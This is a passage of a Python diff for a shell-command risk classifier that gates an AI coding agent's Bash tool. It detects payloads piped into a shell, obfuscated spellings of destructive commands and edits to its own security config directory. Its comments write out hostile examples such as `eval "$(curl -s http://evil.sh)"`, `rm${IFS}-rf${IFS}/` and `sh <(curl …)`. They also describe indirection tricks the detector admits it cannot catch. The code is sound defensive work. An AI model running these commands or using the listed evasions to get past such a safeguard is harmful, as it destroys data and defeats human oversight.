+    "-delete", "-exec", "-execdir", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf", "-fls",
+}
+#: Only a bare name or a system bin dir: ``./cat`` is whatever the agent wrote there.
+_SYSTEM_BIN = re.compile(r"^(?:/usr(?:/local)?|/opt/homebrew)?/s?bin/[^/]+$")
+_WRITE_REDIRECTS = {">", ">>"}
+_FILE_COMPILE_FLAG = re.compile(r"^-[A-Za-z]*C")
+_FD_DUP_TARGET = re.compile(r"^(?:\d+|-)$")
+
+
+class _RafterDirScan:
+    __slots__ = ("protected",)
+
+    def __init__(self) -> None:
+        self.protected = False
+
+
+def _rafter_dir_scan(command: str) -> bool:
+    """True if some statement names the rafter dir and is not read-only."""
+    acc = _RafterDirScan()
+    _scan_rafter_dir_statements(command, 0, acc)
+    return acc.protected
+
+
+def _scan_rafter_dir_statements(command: str, depth: int, acc: _RafterDirScan) -> None:
+    # Past the recursion cap, or on a desynchronized parse, the structure is
+    # unknown: FAIL CLOSED, a reference anywhere in the text protects it.
+    if depth > _MAX_SANITIZE_DEPTH:
+        if _names_rafter_dir(command, False):
+            acc.protected = True
+        return
+    pieces, unterminated = _tokenize(command)
+    if unterminated and _names_rafter_dir(command, False):
+        acc.protected = True
+
+    stmt: list[_Piece] = []
+    for i, p in enumerate(pieces):
+        for sub in p.substs:
+            _scan_rafter_dir_statements(sub, depth + 1, acc)
+        if p.op is not None and p.op in _CHAIN_OPS:
+            # ``>|``, ``>&``, ``&>``, ``&>>`` are redirects spelled with a chain
+            # character; splitting on them would orphan the target from its ``>``.
+            prev = pieces[i - 1] if i > 0 else None
+            nxt = pieces[i + 1] if i + 1 < len(pieces) else None
+            after_redirect = (
+                p.op not in ("&&", "||") and prev is not None
+                and prev.end == p.start and prev.op in _WRITE_REDIRECTS
+            )
+            before_redirect = (
+                p.op == "&" and nxt is not None
+                and nxt.start == p.end and nxt.op in _WRITE_REDIRECTS
+            )
+            if not after_redirect and not before_redirect:
+                _scan_rafter_dir_statement(stmt, acc)
+                stmt = []
+                continue
+        stmt.append(p)
+    _scan_rafter_dir_statement(stmt, acc)
+
+
+def _scan_rafter_dir_statement(stmt: list[_Piece], acc: _RafterDirScan) -> None:
+    argv0 = -1
+    redirect = False
+    names = False
+    for i, p in enumerate(stmt):
+        if p.op is not None:
+            if p.op in _WRITE_REDIRECTS and not _discards_output(stmt, i):
+                redirect = True
+            continue
+        prev_op = stmt[i - 1].op if i > 0 else None
+        is_redirect_target = prev_op is not None and prev_op in _REDIRECT_OPS
+        # Executing a binary that lives in the dir (``~/.rafter/bin/betterleaks
+        # version``) is not a reference; its arguments still are. Only an
+        # UNQUOTED argv0 is a path the shell runs: a quoted one is a heredoc
+        # body line or other code, never a binary.
+        if argv0 == -1 and not is_redirect_target:
+            argv0 = i
+            if not p.quoted and not _ENV_ASSIGNMENT.match(p.text):
+                continue
+        if _names_rafter_dir(p.text, not p.quoted):
+            names = True
+    if names and (redirect or not _statement_read_only(stmt, argv0)):
+        acc.protected = True
+
+
+def _discards_output(stmt: list[_Piece], i: int) -> bool:
+    """``2>/dev/null``, ``2>&1``, ``>&-``: an output redirect that writes no file."""
+    j = i + 1
+    dup = False
+    if j < len(stmt) and stmt[j].op == "&" and stmt[j].start == stmt[i].end:
+        dup = True
+        j += 1
+    if j >= len(stmt):
+        return False
+    target = stmt[j]
+    if target.op is not None or target.substs:
+        return False
+    return bool(_FD_DUP_TARGET.match(target.text)) if dup else target.text == "/dev/null"
+
+
+def _statement_read_only(stmt: list[_Piece], argv0: int) -> bool:
+    if argv0 == -1:
+        return True  # empty, or only an input redirect
+    head = stmt[argv0]
+    if not head.quoted and _ENV_ASSIGNMENT.match(head.text):
+        return False
+    if "/" in head.text and not _SYSTEM_BIN.match(head.text):
+        return False
+    exec_ = head.text[head.text.rfind("/") + 1:]
+    if exec_ not in _READ_ONLY_EXECS:
+        return False
+    args = [p for p in stmt[argv0 + 1:] if p.op is None]
+    if exec_ == "find":
+        return not any(a.text in _FIND_WRITE_ACTIONS for a in args)
+    if exec_ == "rg":  # --pre runs a program on every file searched
+        return not any(a.text.startswith("--pre") for a in args)
+    if exec_ == "file":  # -C compiles a magic file, writing it
+        return not any(a.text == "--compile" or _FILE_COMPILE_FLAG.match(a.text) for a in args)
+    if exec_ in ("cd", "pushd", "popd"):
+        # Claude Code's Bash tool keeps its cwd between calls, so a cd INTO the
+        # dir would make the next call's bare ``config.json`` a write there
+        # with no reference left to catch. cd elsewhere stays read-only.
+        return not any(a.substs or _names_rafter_dir(a.text, not a.quoted) for a in args)
+    return True
+
+
+def shell_program_from_stream(command: str) -> bool:
+    """True if a SHELL receives its program through a channel rather than as a path.
+
+    rf-zvll mechanism B. Three shapes, all measured executing by the sandboxed
+    oracle while classifying `low`:
+
+        cat payload.txt | sh        the payload is in a file
+        echo <b64> | base64 -d | sh the payload is encoded
+        bash < payload.txt          no pipe at all, just a redirect
+
+    The classifier cannot read any of them, so no amount of better parsing
+    recovers the payload -- this is a POSTURE decision, not an analysis one. A
+    shell fed from a channel requires approval regardless of whether we can see
+    what it is being fed.
+
+    DELIBERATELY EXCLUDES a plain file ARGUMENT (`bash deploy.sh`). We cannot
+    read that either, so the distinction is not one of RISK -- it is one of
+    FREQUENCY, and saying so plainly matters more than dressing it up. Measured
+    over 13,613 intercepted commands: the stream forms are 0.022% of traffic in
+    2 of 665 repos, while `curl|wget` into a shell -- already approval-gated --
+    is 100 events. The form that already prompts is 33x more common than
+    everything this newly gates, so the added prompt volume is ~3% of what
+    curl|bash already generates. That sample is ONE machine; the limit and what
+    would overturn it are recorded on rf-zvll.
+    """
+    pieces, _ = _tokenize(command)
+    segments: list[list[_Piece]] = []
+    enders: list[str | None] = []
+    cur: list[_Piece] = []
+    for piece in pieces:
+        if piece.op is not None and piece.op in _CHAIN_OPS:
+            segments.append(cur)
+            enders.append(piece.op)
+            cur = []
+            continue
+        cur.append(piece)
+    segments.append(cur)
+    enders.append(None)
+
+    def _resolve(seg: list[_Piece]) -> str:
+        """Exec of a segment, skipping wrappers, their flags and env assignments.
+
+        Iterative, not one step: `env FOO=1 bash` needs two skips, and a single
+        lookahead silently resolved to `FOO=1` -- caught by its own test row.
+        """
+        words = [w for w in seg if w.op is None]
+        k = 0
+        while k < len(words):
+            t = words[k].text
+            if _ENV_ASSIGNMENT.match(t) or t.startswith("-"):
+                k += 1
+                continue
+            if _exec_name(t) in _TAIL_WRAPPERS:
+                k += 1
+                continue
+            return _exec_name(t)
+        return ""
+
+    for idx, seg in enumerate(segments):
+        exec_ = _resolve(seg)
+        # `eval "$(cat f)"` / `eval "$(curl -s http://x)"` -- a program-executing
+        # consumer fed from a substitution whose OUTPUT we cannot read. Same
+        # semantic test as the pipe case; pipe-vs-substitution is syntax.
+        #
+        # Deliberately covers ANY substitution rather than only data-readers.
+        # A reader-only rule looked tempting and misses
+        # `eval "$(curl -s http://evil.sh)"` -- remote code, the worst shape in
+        # the set -- so the narrow version was rejected on that, not on taste.
+        # Measured cost of the broad rule: ZERO occurrences in 13,647 commands
+        # across 671 repos, so it gates nothing anyone actually runs here.
+        if exec_ in _EVAL_EXECS and any(w.op is None and w.substs for w in seg):
+            return True
+        if exec_ in _SHELL_EXECS:
+            # `bash < file` / `bash <<< str` -- the program arrives on stdin.
+            for w in seg:
+                if w.op in ("<", "<<<"):
+                    return True
+        # `… | bash` -- this segment's OUTPUT is the next one's program.
+        if enders[idx] == "|" and idx + 1 < len(segments):
+            if _resolve(segments[idx + 1]) in _SHELL_EXECS:
+                return True
+    return False
+
+
+# ---------------------------------------------------------------------------
+# Obfuscation normalizer + evasion-construct detector (sable-jtxp)
+# ---------------------------------------------------------------------------
+#
+# The risk patterns match the SPELLING of a command, so an attacker can keep a
+# catastrophic command's effect while changing its spelling past the patterns:
+# long flags (`rm --recursive --force /`), `$IFS` word-splitting
+# (`rm${IFS}-rf${IFS}/`), brace expansion (`{rm,-rf,/}`), ANSI-C quoting
+# (`bash -c $'rm\x20-rf\x20/'`), or process substitution into a shell
+# (`sh <(curl …)`). Two layers answer this, applied in assess_command_risk:
+#
+#   1. normalize_for_matching() un-obfuscates a bounded set of these spellings --
+#      WITHOUT executing anything -- and the patterns match the normalized form
+#      as well as the raw/sanitized one (highest risk wins).
+#   2. evasion_construct_risk() independently rates the obfuscation constructs
+#      themselves as approval-grade, so a construct whose decoded payload the
+#      classifier still cannot read is gated rather than allowed.
+#
+# LIMITATION -- READ BEFORE RELYING ON THIS. It recognizes a fixed set of
+# SPELLINGS; it is DEFENCE IN DEPTH, NOT a containment boundary. It does not and
+# cannot stop an adversary who INDIRECTS the command so the dangerous token never
+# appears literally -- assembled through a shell variable (`X=rm; $X -rf /`),
+# produced by a command substitution (`$(…)` in command position), or handed to
+# an interpreter whose argument the classifier cannot read (a payload piped into
+# a non-shell `python`/`perl`, a base64 blob decoded at runtime). Those are
+# deliberately NOT chased here: a pass that tried to gate variable indirection or
+# `$(…)` in command position also catches legitimate `$CC` / `$(which python)`
+# shapes, so the real answer is a deny-by-default execution redesign, tracked
+# separately (hoare's epic sable-75st; this change is sable-jtxp). Everything
+# here only ever EXPOSES more to the patterns -- the safe direction -- and the
+# quoted-data redaction in sanitize_command_for_matching still runs on the
+# normalized form, so decoding a quoted commit message does not make it match.
+
+_MAX_NORMALIZE_INPUT = 20000
+_MAX_NORMALIZE_OUTPUT = 40000
+_MAX_BRACE_PASSES = 24
+
+_ANSI_C_SIMPLE = {
+    "t": "\t", "n": "\n", "r": "\r", "\\": "\\", "'": "'", '"': '"',
+    "a": "\x07", "b": "\b", "f": "\f", "v": "\v", "e": "\x1b", "E": "\x1b",
+}
+_BRACE_LIST = re.compile(r"(?<!\$)\{([^{}]*,[^{}]*)\}")
+_BRACE_CMD = re.compile(r"^\{[^{}]*,[^{}]*\}")
+_RM_CANON = re.compile(
+    r"(^|[\s;&|()<>])((?:[\w./-]*/)?rm)((?:[ \t]+--?[A-Za-z][\w-]*)*)",
+    re.IGNORECASE,
+)
+
+
+def _decode_ansi_c_string_at(s: str, i: int) -> tuple[str, int]:
+    """Decode one ANSI-C ``$'…'`` whose opening ``$'`` is at ``i``; return the
+    decoded content and the index just past the closing quote. Parses ``$'…'``
+    with its own escape rules (``\\'`` does NOT terminate), which is why plain
+    single-quote handling cannot see through it."""
+    i += 2
+    n = len(s)
+    decoded: list[str] = []
+    while i < n and s[i] != "'":
+        if s[i] == "\\" and i + 1 < n:
+            i += 1
+            c = s[i]
+            if c in ("x", "X"):
+                i += 1
+                hex_ = ""
+                while i < n and len(hex_) < 2 and s[i] in "0123456789abcdefABCDEF":
+                    hex_ += s[i]
+                    i += 1
+                decoded.append(chr(int(hex_, 16)) if hex_ else "x")
+                continue
+            if "0" <= c <= "7":
+                oct_ = ""
+                while i < n and len(oct_) < 3 and "0" <= s[i] <= "7":
+                    oct_ += s[i]
+                    i += 1
+                decoded.append(chr(int(oct_, 8) & 0xFF))
+                continue
+            decoded.append(_ANSI_C_SIMPLE.get(c, c))
+            i += 1
+            continue
+        decoded.append(s[i])
+        i += 1
+    if i < n:
+        i += 1  # consume the closing quote
+    return "".join(decoded), i
+
+
+def _decode_ansi_c_quotes(s: str) -> str:
+    """Decode every ANSI-C ``$'…'`` string, keeping each result ONE quoted word."""
+    if "$'" not in s:
+        return s
+    out: list[str] = []
+    i = 0
+    n = len(s)
+    while i < n:
+        if s[i] == "$" and i + 1 < n and s[i + 1] == "'":
+            decoded, i = _decode_ansi_c_string_at(s, i)
+            out.append("'" + decoded.replace("'", "'\\''") + "'")
+            continue
+        out.append(s[i])
+        i += 1
+    return "".join(out)
+
+
+def _ansi_c_hides_word_boundary(s: str) -> bool:
+    """True if some ``$'…'`` decodes to content that HIDES A WORD BOUNDARY --
+    interior whitespace separating two or more tokens (``$'rm\\x20-rf\\x20/'``),
+    the shape that reconstructs a multi-word command inside one quoted word. A
+    ``$'…'`` that decodes to a lone separator (``$'\\t'``, ``$'\\n'``) or a single
+    token (``$'hi'``, a color escape) is a legitimate data literal and is NOT
+    flagged -- matching on bare presence over-blocked idioms like ``grep -P $'\\t'``."""
+    if "$'" not in s:
+        return False
+    i = 0
+    while True:
+        i = s.find("$'", i)
+        if i == -1:
+            return False
+        decoded, i = _decode_ansi_c_string_at(s, i)
+        if len(decoded.split()) > 1:
+            return True
+
+
+def _expand_brace_lists(s: str) -> str:
+    """Expand simple brace lists ``{a,b,c}`` to space-separated ``a b c``.
+
+    Space-join, NOT the shell's cartesian product, so adjacent groups cannot blow
+    up; the over-approximation only exposes more tokens. ``(?<!\\$)`` leaves
+    ``${VAR}`` alone and a comma is required, so ``${IFS}`` and ``{}`` are
+    untouched. Innermost-first over bounded passes handles nesting.
+    """
+    if "{" not in s:
+        return s
+    passes = 0
+    prev = None
+    while prev != s and passes < _MAX_BRACE_PASSES:
+        prev = s
+        s = _BRACE_LIST.sub(lambda m: " ".join(m.group(1).split(",")), s)
+        passes += 1
+        if len(s) > _MAX_NORMALIZE_OUTPUT:
+            s = s[:_MAX_NORMALIZE_OUTPUT]
+            break
+    return s
+
+
+def _canonicalize_rm_flags(s: str) -> str:
+    """Reduce an ``rm`` carrying BOTH recursive and force intent -- in any long,
+    short or ``--no-preserve-root`` spelling, adjacent or not -- to the ``rm -rf``
+    form the patterns catch. Scoped to ``rm`` and only ever adds ``-rf``."""
+    if not re.search(r"\brm\b", s, re.IGNORECASE):
+        return s
+
+    def repl(m: "re.Match[str]") -> str:
+        pre, cmd, flags = m.group(1), m.group(2), m.group(3)
+        if not flags.strip():
+            return m.group(0)
+        recursive = force = False
+        for tok in flags.split():
+            low = tok.lower()
+            if low.startswith("--"):
+                if low == "--recursive":
+                    recursive = True
+                elif low in ("--force", "--no-preserve-root"):
+                    force = True
+            else:
+                if "r" in low:
+                    recursive = True
+                if "f" in low:
+                    force = True
+        return f"{pre}{cmd} -rf" if (recursive and force) else m.group(0)
+
+    return _RM_CANON.sub(repl, s)
+
+
+def normalize_for_matching(command: str) -> str:
+    """A spelling-normalized view of a command for pattern matching.
+
+    Decodes ANSI-C quoting, substitutes ``$IFS``/``${IFS}``, expands brace lists,
+    canonicalizes destructive-flag spellings, and collapses whitespace runs.
+    Executes nothing; bounded against hostile input.
+    """
+    if not command:
+        return command
+    s = command[:_MAX_NORMALIZE_INPUT] if len(command) > _MAX_NORMALIZE_INPUT else command
+    s = _decode_ansi_c_quotes(s)
+    s = re.sub(r"\$\{IFS\}", " ", s)
+    s = re.sub(r"\$IFS(?![A-Za-z0-9_])", " ", s)
+    s = _expand_brace_lists(s)
+    s = _canonicalize_rm_flags(s)
+    # Collapse runs of spaces/tabs; keep newlines/CRs as statement separators.
+    s = re.sub(r"[^\S\n\r]+", " ", s)
+    if len(s) > _MAX_NORMALIZE_OUTPUT:
+        s = s[:_MAX_NORMALIZE_OUTPUT]
+    return s
+
+
+def _resolve_exec_piece(seg: list[_Piece]) -> _Piece | None:
+    """The exec piece of a segment (skipping env assignments and prefix wrappers)."""
+    is_redirect_target = [False] * len(seg)
+    for i in range(1, len(seg)):
+        if seg[i - 1].op in _REDIRECT_OPS and seg[i].op is None:
+            is_redirect_target[i] = True
+    i = 0
+    while i < len(seg):
+        p = seg[i]
+        if p.op is not None or is_redirect_target[i]:
+            i += 1
+            continue
+        if not p.quoted and _ENV_ASSIGNMENT.match(p.text):
+            i += 1
+            continue
+        if not p.quoted and _exec_name(p.text) in _TAIL_WRAPPERS:
+            j = i + 1
+            while j < len(seg):
+                q = seg[j]
+                if q.op is not None or is_redirect_target[j]:
+                    j += 1
+                    continue
+                if q.text.startswith("-") or _NUMERIC_ARG.match(q.text):
+                    j += 1
+                    continue
+                break
+            i = j
+            continue
+        return p
+    return None
+
+
+def evasion_construct_risk(command: str) -> bool:
+    """True if the command uses a shell OBFUSCATION construct that should require
+    approval even when the normalized payload still cannot be read: ``$IFS``
+    splitting, ANSI-C ``$'…'``, a brace list in COMMAND position, a process
+    substitution feeding a shell/eval, or a base64 decode piped into a shell.
+    Narrow by design -- a brace ARGUMENT or a process substitution into a
+    non-shell (``diff <(a) <(b)``) is routine and not flagged."""
+    if not command:
+        return False
+    s = command[:_MAX_NORMALIZE_INPUT] if len(command) > _MAX_NORMALIZE_INPUT else command
+    if re.search(r"\$\{IFS\}|\$IFS\b", s):
+        return True
+    if _ansi_c_hides_word_boundary(s):
+        return True
+    if re.search(r"\bbase64\b[\s\S]*\|\s*(ba|z|da|k|a)?sh\b", s, re.IGNORECASE):
+        return True
+
+    pieces, unterminated = _tokenize(s)
+    if unterminated:
+        return False
+    segments: list[list[_Piece]] = []
+    seg: list[_Piece] = []
+    for p in pieces:
+        if p.op is not None and p.op in _CHAIN_OPS:
+            segments.append(seg)
+            seg = []
+            continue
+        seg.append(p)
+    segments.append(seg)
+
+    for segment in segments:
+        exec_piece = _resolve_exec_piece(segment)
+        if exec_piece is None:
+            continue
+        if exec_piece.text and _BRACE_CMD.match(exec_piece.text):
+            return True
+        name = _exec_name(exec_piece.text)
+        if name in _SHELL_EXECS or name in _EVAL_EXECS:
+            for p in segment:
+                if p.op is None and p.text == "" and p.substs:
+                    if s[p.start:p.start + 2] in ("<(", ">("):
+                        return True
+    return False
+
+
+def _match_variants(command: str) -> list[str]:
+    """The distinct sanitized views a command's risk is judged against: the raw
+    command and -- when normalization changed it -- the spelling-normalized one."""
+    raw = sanitize_command_for_matching(command).strip()
+    variants = [raw] if raw else []
+    normalized = normalize_for_matching(command)
+    if normalized != command:
+        norm_san = sanitize_command_for_matching(normalized).strip()
+        if norm_san and norm_san != raw:
+            variants.append(norm_san)
+    return variants
 
 
 def assess_command_risk(command: str) -> str:
     """Assess risk level of a command string."""
-    cmd = sanitize_command_for_matching(command).strip()
-    if not cmd:
+    # rf-vnxs: checked before the pattern loops. The disarm is an ordinary
+    # well-formed invocation — nothing malformed for the sanitizer to normalise.
+    if modifies_rafter_security_config(command):
+        return "critical"
+    # sable-jtxp: match against the raw AND the spelling-normalized view, so a
+    # command whose spelling evades the patterns is still caught.
+    variants = _match_variants(command)
+    if not variants:
         return "low"
     for p in CRITICAL_PATTERNS:
-        if re.search(p, cmd, re.IGNORECASE):
+        if any(re.search(p, v, re.IGNORECASE) for v in variants):
             return "critical"
+    # rf-zvll B2 + sable-jtxp: a shell fed its program from a channel we cannot
+    # read, or an obfuscation construct whose payload we cannot read, requires
+    # approval. Checked AFTER critical so `echo 'rm -rf /' | sh` -- where the
+    # payload IS readable and matches -- keeps its hard block rather than being
+    # softened to approval.
+    if shell_program_from_stream(command) or evasion_construct_risk(command):
+        return "high"
     for p in HIGH_PATTERNS:
-        if re.search(p, cmd, re.IGNORECASE):
+        if any(re.search(p, v, re.IGNORECASE) for v in variants):
             return "high"
     for p in MEDIUM_PATTERNS:
-        if re.search(p, cmd, re.IGNORECASE):
+        if any(re.search(p, v, re.IGNORECASE) for v in variants):
             return "medium"
     return "low"
 
@@ -495,12 +1605,12 @@ def assess_command_risk(command: str) -> str:
 def match_critical_pattern(command: str) -> str | None:
     """Return the first CRITICAL pattern matching the command, or None.
 
-    Mirrors assess_command_risk's sanitization. Intended to be called only once a
-    command is already classified "critical", to surface *which* built-in rule
-    matched.
+    Mirrors assess_command_risk's sanitization and normalization. Intended to be
+    called only once a command is already classified "critical", to surface
+    *which* built-in rule matched.
     """
-    cmd = sanitize_command_for_matching(command).strip()
+    variants = _match_variants(command)
     for p in CRITICAL_PATTERNS:
-        if re.search(p, cmd, re.IGNORECASE):
+        if any(re.search(p, v, re.IGNORECASE) for v in variants):
             return p
     return None
